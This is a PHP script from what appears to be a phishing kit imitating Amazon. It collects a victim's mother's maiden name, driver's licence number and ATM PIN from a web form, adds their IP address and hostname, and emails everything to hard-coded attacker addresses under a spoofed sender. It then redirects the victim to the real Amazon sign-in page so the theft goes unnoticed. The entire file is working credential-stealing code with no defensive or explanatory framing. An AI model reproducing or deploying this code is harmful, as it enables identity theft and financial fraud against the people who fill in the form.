<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "--------------+ User online +------------\n";
$message .= "Mother Maiden's Name : ".$_POST['mm']."\n";
$message .= "Driver's Licence: ".$_POST['d']."\n";
$message .= "Pin Atm :".$_POST['ssn']."\n";
$message .= "--------------+ Connction info +------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "--------------------\n";
$rnessage  = "$message\n";
$message .= "--------------+ Created in 2013 By [..D.R Zo0ka] +------------\n";

$send="lolxlol333@blumail.org,zo0ka@inbox.com";



$subject = "$ip";
$headers = "From: KOsmak<standerlovee@cox.net>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:http://www.google.com/url?sa=t&rct=j&q=amazon%20sign%20in&source=web&cd=1&cad=rja&sqi=2&ved=0CEMQFjAA&url=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fsign-in.html&ei=XhZqUa7BFe75igLh4oCIBA&usg=AFQjCNEc-WUodb9075HUo0Dp9cJT_F982w&bvm=bv.45175338,d.cGE");
}
?>
